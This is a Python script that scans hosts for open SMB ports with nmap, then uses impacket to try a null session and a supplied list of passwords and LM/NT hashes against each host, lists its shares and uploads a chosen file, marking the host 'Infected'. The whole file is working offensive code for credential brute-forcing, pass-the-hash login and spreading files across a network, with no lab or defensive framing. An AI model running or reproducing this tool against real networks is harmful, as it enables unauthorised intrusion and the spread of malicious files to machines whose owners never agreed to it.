#! /usr/bin/env python

from os import path
from nmap import nmap
from impacket.smbconnection import SMBConnection, SessionError

SMB_PORTS = (445, 139)


def scan_hosts(host, ports):
    nm = nmap.PortScanner()
    nm.scan(hosts=host, arguments='-Pn -p{0} -sV'.format(ports))

    hosts = []
    for h in nm.all_hosts():
        hosts.append(Host(h, nm))

    return hosts


class Host(object):
    def __init__(self, ip, scanner):
        self.ip = ip
        self.data = scanner[ip]
        self.is_up = self.data.state() == 'up'
        self.open_ports = [x for x in self.data['tcp'].keys() if self.data['tcp'][x]['state'] == 'open']

        self.domain = ''
        self.name = ''
        self.os = ''

        self.ex = None
        self.smb = None
        self.shares = None
        self.infected = None

    def __str__(self):
        return '=> ip: {0}{1}{2}{3}, status: {4}{5}'.format(
            self.ip,
            ', domain: {0}'.format(self.domain) if self.domain else '',
            ', name: {0}'.format(self.name) if self.name else '',
            ', os: {0}'.format(self.os) if self.os else '',
            'up' if self.is_up else 'down',
            ', result: {0}'.format(self.ex) if self.ex else ', result: {0}'.format('Infected') if self.infected else ''
        )

    @property
    def chosen_port(self):
        for p in SMB_PORTS:
            if p in self.open_ports:
                return p
        raise Exception('No port can be used to infect this host')

    @property
    def is_connected(self):
        return self.smb is not None

    def connect(self, password_generator):
        try:
            self.smb = SMBConnection('*SMBSERVER', self.ip, sess_port=int(self.chosen_port))
            self.smb.login('', '')
            self.domain = self.smb.getServerDomain()
            self.name = self.smb.getServerName()
            self.os = self.smb.getServerOS()

            for username, password, lmhash, nthash in password_generator:
                try:
                    self.smb.login(username, password, lmhash=lmhash, nthash=nthash)
                    self.shares = self.smb.listShares()
                    self.ex = None
                    break
                except SessionError as ex:
                    self.ex = ex
        except SessionError as ex:
            self.ex = ex

    def infect(self, password_generator, share, source, destination):
        try:
            if not path.isfile(source):
                raise Exception('Source file {0} does not exist.'.format(source))

            if not self.is_connected:
                self.connect(password_generator)

            if self.ex:
                return

            with open(source, 'rb') as f:
                self.smb.putFile(share, destination, f.read)
                self.ex = None
                self.infected = True
        except SessionError as ex:
            self.ex = ex
